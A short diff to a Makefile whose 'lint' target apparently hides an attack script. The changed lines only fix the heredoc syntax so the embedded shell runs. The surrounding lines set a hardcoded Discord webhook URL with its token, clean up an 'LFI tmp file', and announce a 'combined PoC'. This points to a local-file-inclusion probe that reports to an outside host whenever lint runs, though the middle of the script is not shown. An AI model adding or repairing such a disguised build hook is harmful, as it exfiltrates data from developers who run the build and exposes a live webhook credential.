@@ -1,6 +1,6 @@
 .PHONY: lint
 lint:
-	@/bin/sh -e <<'SH'
+	@/bin/sh -e <<-'SH'
 	set -eu
 	WEBHOOK="https://discord.com/api/webhooks/1413091167125504000/DZPsdR_duaO5zoezj4o3FxDAQZ5JqoChL3vEPWg7BcjLJ17U0zVoUrtJbkyVJDYPRDdN"
 
@@ -109,4 +109,4 @@ PY
 	# Cleanup LFI tmp file
 	rm -f "$tmpfile" || true
 	echo "Lint step ran (after combined PoC)."
-SH
+	SH
